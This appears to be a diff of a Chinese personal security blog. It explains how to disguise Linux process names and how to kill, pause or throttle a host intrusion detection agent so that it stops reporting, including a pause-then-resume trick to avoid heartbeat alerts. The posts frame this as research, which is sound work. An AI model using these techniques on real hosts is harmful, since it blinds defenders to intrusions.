+<h1 id="通过”修改进程argv-0-”隐藏进程名称"><a href="#通过”修改进程argv-0-”隐藏进程名称" class="headerlink" title="通过”修改进程argv[0]”隐藏进程名称"></a>通过”修改进程argv[0]”隐藏进程名称</h1><ul>
+<li><p>怎么通过”修改进程argv[0]”隐藏进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>谁用了这种方式？</p>
+<p>恶意软件<a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py">puppy</a> 就用到了这种方式修改进程名为”[kworker/2:0]”。</p>
+<blockquote>
+<p>“[XXXX]”这种进程名都是内核线程</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/131245230-c8f97321-5d04-41f9-a347-f7a4f69e3794.png" alt="image"></p>
+</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253587-ec40a6c2-2b19-4df1-90d3-68a6772be975.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
+</ul>
+<h1 id="通过”软链接”改变进程名称"><a href="#通过”软链接”改变进程名称" class="headerlink" title="通过”软链接”改变进程名称"></a>通过”软链接”改变进程名称</h1><ul>
+<li><p>是什么？</p>
+<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">两个主题：躲避execve与分析/proc/目录</a> 这篇文章提到了：利用”软链接”可以改变进程信息，并且文件哈希和源文件不一致，这样可以用来躲避安全产品的监控。</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256254-29bd80e0-8475-47f2-a13f-c6d4bfcc3b39.png" alt="image"></p>
+<p>可以看到：只有exe文件还有原程序信息，所以这种方式隐藏进程名的效果是最好的。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以有以下结论：</p>
+<ul>
+<li>单看四种隐藏方式，”软链接”这种方式隐蔽得最好；其他几种方式，comm、stat、cmdline、status文件中总会有原程序相关信息</li>
+<li>不论哪种方式，exe文件仍然有原程序相关信息</li>
+<li>像”prctl系统调用”这种方式应该避免使用</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">如何结束和暂停agent进程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>就像 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 说的，hids agent会上报很多信息，安全防护策略也是围绕”agent上报的信息”制定的。</p>
+<p>那如果攻击者”结束、暂停agent进程”，导致agent功能废掉，是不是就能够绕过hids的防护呢？</p>
+<p>研究过程中，我发现并不能轻易地结束agent进程；”结束和暂停agent进程”会带来”心跳失联”的异常特征，可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
+<p>本文主要讨论以下问题：</p>
+<ul>
+<li>怎么结束agent进程？</li>
+<li>怎么暂停agent进程？</li>
+<li>“心跳失联”</li>
+</ul>
+<h1 id="结束agent进程"><a href="#结束agent进程" class="headerlink" title="结束agent进程"></a>结束agent进程</h1><ul>
+<li><p>怎么结束agent进程？</p>
+<p>在linux上执行 <code>kill -SIGKILL 进程号</code> 是一定可以结束进程的，因为 SIGKILL信号不能被忽略或者做其他处理。</p>
+<p>但是我们杀掉hids agent进程后，agent进程会自动重启。</p>
+</li>
+<li><p>怎么实现”挂掉自动重启”？</p>
+<p>经过调研，”挂掉自动重启”机制在linux最常见的实现方式包括：</p>
+<blockquote>
+<p>通过 systemd、supervisord 等实现</p>
+<p>crond：通过计划任务</p>
+<p>watchdog</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/server/docs/quick-start-zh_CN.md">字节hids文档</a> 推荐的也是”systemd”和”crond”这两种方式。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/0923/234007_74229bc1_83508.png" alt="字节hids文档" title="屏幕截图.png"></p>
+<p>有对supervisord、systemd实现原理感兴趣的，可以看最后一节。</p>
+</li>
+<li><p>怎么结束被systemd、supervisord管理的进程？</p>
+<p>supervisord和systemd等管理的进程可以通过”supervisorctl”和”systemctl”等命令关掉。</p>
+<p>这两命令实际也是通过”本地socket通信”告诉supervisord和systemd结束进程，所以当没有办法使用”supervisorctl”和”systemctl”命令时，也可以编写程序直接和”本地socket文件”通信。</p>
+</li>
+</ul>
+<h1 id="暂停agent进程"><a href="#暂停agent进程" class="headerlink" title="暂停agent进程"></a>暂停agent进程</h1><ul>
+<li><p>怎么暂停agent进程？</p>
+<p>向进程发送SIGSTOP、SIGTSTP、SIGTTIN等信号都可能暂停进程，推荐用SIGSTOP信号，原因是进程收到其他信号还能忽略，收到SIGSTOP信号却只能暂停进程。</p>
+<p>这个结论可以在<code>man 7 signal</code>看到</p>
+<blockquote>
+<p>The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p>“暂停的agent进程”是否会被自动重启或者恢复运行状态？</p>
+<p>这里还存在一个小问题：当子进程被暂停或者结束时，父进程是可以收到SIGCHLD信号的。那systemd遇到子进程暂停时，会不会重启进程？</p>
+<p>经过测试和源码对比，我的结论是：systemd不会。</p>
+</li>
+<li><p>测试某hids</p>
+<p>经过对某hids做测试，发现stop状态的agent进程会被恢复成运行状态。</p>
+<p>agent进程的父进程的父进程才是systemd，所以估计是agent父进程收到SIGCHLD信号后向agent进程发送了SIGCONT信号恢复运行状态。</p>
+<p>当把hids所有的agent进程都暂停后，符合预期：所有agent进程一直被暂停。</p>
+</li>
+</ul>
+<h1 id="“心跳失联”的问题"><a href="#“心跳失联”的问题" class="headerlink" title="“心跳失联”的问题"></a>“心跳失联”的问题</h1><ul>
+<li><p>“心跳失联”是什么？</p>
+<p>正常情况下，agent按照一定频率会发送”心跳包”告诉server自己存活。</p>
+<p>如果”结束和暂停agent进程”，就会影响到”心跳包”的发送。进而server端是可以感知到agent异常的。</p>
+<p>这种异常可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
+</li>
+<li><p>怎么解决”心跳失联”的问题？</p>
+<p>凭空想象的一种解决方法：恶意样本 先暂停agent进程，等到恶意行为完成后，再恢复agent进程。</p>
+<p>这样心跳也存在，也有可能绕过hids防护。</p>
+</li>
+</ul>
+<h1 id="systemd是怎么知道”进程挂掉”？"><a href="#systemd是怎么知道”进程挂掉”？" class="headerlink" title="systemd是怎么知道”进程挂掉”？"></a>systemd是怎么知道”进程挂掉”？</h1><p>先说我验证的结论：</p>
+<ul>
+<li>systemd为sigchild信号注册了一个处理函数，函数内部调用waitid处理退出的子进程。</li>
+<li>当systemd管理的进程退出时，systemd进程会收到sigchild信号，进而跳转到处理函数。</li>
+</ul>
+<p>从<a target="_blank" rel="noopener" href="https://github.com/systemd/systemd/blob/71a80dcc0b64b01c73e7141c4292ef301543a011/src/core/manager.c">systemd源码</a>可以看到manager_setup_sigchld_event_source函数就是”sigchild信号的处理函数”。<br><img src="https://images.gitee.com/uploads/images/2021/0923/234046_4aa2c450_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>如果systemd进程号为1，也可以通过<code>strace -p 1</code>来验证结论：</p>
+<p>结束systemd管理的进程时（下面例子中是83206号进程），可以看到waitid系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">waitid(P_ALL, 0, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">waitid(P_PID, 83206, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WEXITED, NULL) &#x3D; 0</span><br><span class="line">waitid(P_ALL, 0, &#123;&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>supervisord和systemd有点类似，不一样的是supervisord似乎只用wait等系统调用，来判断子进程是否已经退出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep supervi</span><br><span class="line">root     13170  0.0  0.0  56368 12760 ?        Ss   6月01  71:47 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;usr&#x2F;bin&#x2F;supervisord -c &#x2F;data&#x2F;poc-web-api&#x2F;docker&#x2F;supervisor.conf</span><br><span class="line">[root@instance-fj5pftdp ~]# strace -p 13170 2&gt;&amp;1 | grep -i wait</span><br><span class="line">...</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, [&#123;WIFSIGNALED(s) &amp;&amp; WTERMSIG(s) &#x3D;&#x3D; SIGKILL&#125;], WNOHANG, NULL) &#x3D; 5557</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>“结束进程”需要考虑到”进程挂掉重启”的场景</li>
+<li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
+</ul>
+<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
 
       
     </div>
@@ -700,171 +997,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">如何限制agent进程的资源使用</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 问题背景中提到：agent会上报信息，甚至会上传文件。</p>
-<p>如果能够限制agent进程对系统资源的使用，是不是可能对”信息上报”造成影响。比如限制agent进程每秒只能读1字节的文件内容、限制agent上报文件带宽在1字节每秒、限制agent只能使用很少的cpu分片等等。</p>
-<p>本文记录对”限制资源使用”的实践：</p>
-<ul>
-<li>怎么限制进程的网络带宽</li>
-<li>怎么限制进程的io读速度</li>
-<li>怎么限制进程的cpu使用率</li>
-</ul>
-<p>“对进程资源的限制”有很多使用场景，比如我看到有人问 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo/issues/22">怎么控制crawlergo爬虫的cpu和内存使用率</a>，再比如 hids本身也需要对cpu、内存等使用做限制。</p>
-<h1 id="agent进程带宽限速"><a href="#agent进程带宽限速" class="headerlink" title="agent进程带宽限速"></a>agent进程带宽限速</h1><ul>
-<li><p>为什么限速？</p>
-<p>如果能让agent进程每秒只能传输很少的字节数，就有可能拖慢agent上报信息的进度，从而干扰安全检测。重点是”网速变慢”能保证”agent心跳”能正常传到server，不至于在server端看到agent异常。</p>
-</li>
-<li><p>在linux主机上怎么给进程限流呢？</p>
-<p>调研总结有两种方式：</p>
-<blockquote>
-<p>cgroups + tc命令：可以实现对指定的进程限速</p>
-<p>iptables：可以实现对指定的tcp通信限速</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="使用iptables对进程限速"><a href="#使用iptables对进程限速" class="headerlink" title="使用iptables对进程限速"></a>使用iptables对进程限速</h2><ul>
-<li><p>怎么用iptables对进程限速？</p>
-<p>可以使用iptables的limit模块来完成。</p>
-<p>根据<code>man iptables-extensions</code>手册可知：limit模块使用”令牌桶算法”实现。</p>
-<p><code>--limit-burst</code>参数指定初始令牌数，<code>--limit</code>参数指定补充令牌的速率。</p>
-<p>举个例子，下面命令可以对目标ip”1.2.3.4”端口为5001的tcp通信做限速：桶最大值也是初始值就是10个tcp包，每秒新增1个tcp包，所以发包速率峰值基本上可以认为是”10个包/每秒”；当客户端每秒有100个包要发出去时，基本上到后面发包速度会基本限制在”1个包/每秒”；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp -m limit --limit 1&#x2F;sec --limit-burst 10 --dport 5001 -j ACCEPT</span><br><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp --dport 5001 -j DROP</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>实践验证限速效果</p>
-<p>准备两台机器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* &#96;instance-fj5pftdp&#96;发包</span><br><span class="line">* &#96;1.2.3.4&#96;收包 (为了我避免暴露自己的虚机ip，这里用1.2.3.4代替)</span><br></pre></td></tr></table></figure>
-
-<p>在发包机器上 使用iptables限制通信，然后传输大文件，并使用tcpdump观察包速率</p>
-<p>第一步：设置iptables，指令如上</p>
-<p>第二步：传输大文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 使用&#96;truncate -s 1G bigfil&#96;创建&quot;稀疏文件&quot;</span><br><span class="line">* 使用&#96;nc 1.2.3.4 5001 &lt; bigfile&#96;传输文件</span><br></pre></td></tr></table></figure>
-
-<p>第三步：使用tcpdump观察包速率：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump -i eth0 &#39;port 5001 and ip dst 1.2.3.4&#39;</span><br><span class="line">22:52:00.743321 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [S], seq 2314647925, win 27200, options [mss 1360,sackOK,TS val 2324847321 ecr 0,nop,wscale 7], length 0</span><br><span class="line">22:52:00.780074 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], ack 1736746942, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 0</span><br><span class="line">22:52:00.780253 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 0:2696, ack 1, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780516 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 2696:5392, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780533 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 5392:8088, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780538 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 8088:8192, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 104</span><br><span class="line">22:52:00.780571 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 8192:10888, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780587 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 10888:12236, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 1348</span><br><span class="line">22:52:00.816636 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 12236:14932, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:00.816674 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 14932:17628, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:02.513394 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 17628:18976, ack 1, win 213, options [nop,nop,TS val 2324849092 ecr 3661297578], length 1348</span><br><span class="line">22:52:02.786393 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 18976:20324, ack 1, win 213, options [nop,nop,TS val 2324849365 ecr 3661299275], length 1348</span><br><span class="line">22:52:04.485382 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 20324:21672, ack 1, win 213, options [nop,nop,TS val 2324851064 ecr 3661299548], length 1348</span><br><span class="line">22:52:04.759396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 21672:23020, ack 1, win 213, options [nop,nop,TS val 2324851338 ecr 3661301247], length 1348</span><br><span class="line">22:52:06.457405 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 23020:24368, ack 1, win 213, options [nop,nop,TS val 2324853036 ecr 3661301521], length 1348</span><br><span class="line">22:52:07.205354 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 24368:25716, ack 1, win 213, options [nop,nop,TS val 2324853784 ecr 3661303219], length 1348</span><br><span class="line">22:52:07.953399 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 25716:27064, ack 1, win 213, options [nop,nop,TS val 2324854532 ecr 3661303967], length 1348</span><br><span class="line">22:52:09.651384 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 27064:28412, ack 1, win 213, options [nop,nop,TS val 2324856230 ecr 3661304715], length 1348</span><br><span class="line">22:52:09.924396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 28412:29760, ack 1, win 213, options [nop,nop,TS val 2324856503 ecr 3661306413], length 1348</span><br><span class="line">22:52:11.621372 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 29760:31108, ack 1, win 213, options [nop,nop,TS val 2324858200 ecr 3661306686], length 1348</span><br><span class="line">22:52:11.894385 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 31108:32456, ack 1, win 213, options [nop,nop,TS val 2324858473 ecr 3661308383], length 1348</span><br><span class="line">22:52:13.593387 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 32456:33804, ack 1, win 213, options [nop,nop,TS val 2324860172 ecr 3661308656], length 1348</span><br></pre></td></tr></table></figure>
-<p>可以看到最开始<code>22:52:00</code>通过了10个包，然后大概每秒可以通过1个包。</p>
-</li>
-</ul>
-<h1 id="agent进程io读限速"><a href="#agent进程io读限速" class="headerlink" title="agent进程io读限速"></a>agent进程io读限速</h1><ul>
-<li><p>在linux主机上怎么给进程io读写限速呢？</p>
-<p>可以通过cgroup实现：cgroup是一种文件系统，可以用来限制cpu、内存、io等资源使用；cgroup也是docker的核心原理之一。</p>
-<p>cgroup有v1、v2两个版本，其中v1 只能限制”直接io”，v2版本对内核版本要求在4.5以上（似乎）。而hids等应用程序读文件大部分应该都是”缓冲io”，所以无法用v1版本的cgroup限制。我也只实验验证v1版本的对”直接io”的限制。</p>
-<blockquote>
-<p>如果想要了解更多”直接io”和”缓冲io”相关概念，可以参考 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/76876">23 | 基础篇：Linux 文件系统是怎么工作的？</a> 这篇。</p>
-</blockquote>
-<p>关于cgroup的介绍和使用可以参考网上的很多文章，比如 <a target="_blank" rel="noopener" href="https://tech.meituan.com/2015/03/31/cgroups.html">Linux资源管理之cgroups简介</a> 和 <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/cgroups.7.html">man手册</a></p>
-<p>“利用cgroup对进程io读写做限速”可以参考 <a target="_blank" rel="noopener" href="https://andrestc.com/post/cgroups-io/">Using cgroups to limit I/O</a>，这一篇文章有完整的实验过程。此小节我只记录”需要注意的细节”和文章没有提到的内容。</p>
-</li>
-</ul>
-<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ul>
-<li><p>确认配置</p>
-<p>根据 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/cgroup-v1/blkio-controller.txt">cgroup-v1文档</a> 手册说明，需要先确认内核是否支持cgroup io限速</p>
-<p>比如确认如下选项是否开启</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_CGROUP</span><br><span class="line">CONFIG_BLK_CGROUP&#x3D;y</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_DEV_THROTTLING</span><br><span class="line">CONFIG_BLK_DEV_THROTTLING&#x3D;y</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>dd命令需要添加<code>oflag=direct</code>参数和bs参数必须是512（一个扇区的大小）的倍数</p>
-<p>因为cgroup v1 只能限制”直接io”，所以dd需要添加<code>oflag=direct</code>参数。</p>
-<p>而使用”直接io”，磁盘io需要扇区对齐，也就是每次写入的字节大小必须是一个扇区大小的倍数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;512 count&#x3D;1 oflag&#x3D;direct</span><br><span class="line">...</span><br><span class="line">512字节(512 B)已复制，0.00518424 秒，98.8 kB&#x2F;秒</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1 oflag&#x3D;direct   &#x2F;&#x2F; 非512倍数时，写入报错</span><br><span class="line">dd: 写入&quot;&#x2F;tmp&#x2F;file2&quot; 出错: 无效的参数</span><br><span class="line">...</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1    &#x2F;&#x2F; &quot;缓冲io&quot;（非&quot;直接io&quot;）时，不需要用户对齐</span><br><span class="line">...</span><br><span class="line">511字节(511 B)已复制，0.000360275 秒，1.4 MB&#x2F;秒</span><br></pre></td></tr></table></figure>
-
-<p>如果想要了解更多”磁盘io对齐”相关知识，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rqq-GgZMMs5gj6p_VJqEVA">存储基础 —— 磁盘 IO 为什么总叫你对齐？</a> 这篇。</p>
-</li>
-<li><p>实验过程中遇到的报错</p>
-<p>在向配置中”写正在使用的分区”和”不正确的设备号”都会提示”无效的参数”报错，如下：</p>
-<p>似乎不能写正在使用的分区”/dev/vda1”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# df -h</span><br><span class="line">...</span><br><span class="line">&#x2F;dev&#x2F;vda1        79G   71G  4.6G  94% &#x2F;</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;proc&#x2F;partitions</span><br><span class="line">major minor  #blocks  name</span><br><span class="line"></span><br><span class="line"> 253        0   83886080 vda</span><br><span class="line"> 253        1   83885039 vda1</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 253对应&#x2F;dev&#x2F;vda1，似乎因为已经被挂载使用，所以不能被写入配置</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:0 100&#39; &gt; blkio.throttle.read_bps_device</span><br></pre></td></tr></table></figure>
-
-<p>不能限制”字符设备”，只能限制”块设备”。当写入”字符设备的设备号”到配置时，就会报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;dev|grep &quot;5,&quot;</span><br><span class="line">crw-------  1 root root      5,   1 Apr 28 21:51 console</span><br><span class="line">crw-rw-rw-  1 root tty       5,   2 Oct 22 13:45 ptmx</span><br><span class="line">crw-rw-rw-  1 root tty       5,   0 Oct 12 13:06 tty</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;5:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 5(主设备号)代表了&quot;字符设备&quot;</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="限制cpu使用"><a href="#限制cpu使用" class="headerlink" title="限制cpu使用"></a>限制cpu使用</h1><ul>
-<li><p>怎么限制cpu使用？</p>
-<p>同样使用cgroup。</p>
-</li>
-</ul>
